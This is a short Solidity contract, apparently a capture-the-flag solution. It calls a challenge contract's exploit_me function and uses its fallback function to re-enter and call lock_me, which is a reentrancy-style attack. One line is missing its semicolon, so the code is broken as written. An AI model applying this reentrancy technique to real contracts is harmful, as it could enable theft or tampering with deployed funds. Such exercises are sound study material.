// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "./interfaces/IChallenge.sol";

contract solution {
    address myContract;

    function hack(address _contract) external {
        myContract = _contract;
        IChallenge(_contract).exploit_me("SCAR FACE");
    }

    function unlock(address _contract) public {
        IChallenge(_contract).lock_me()
    }

    fallback() external {
        unlock(myContract);
    }
}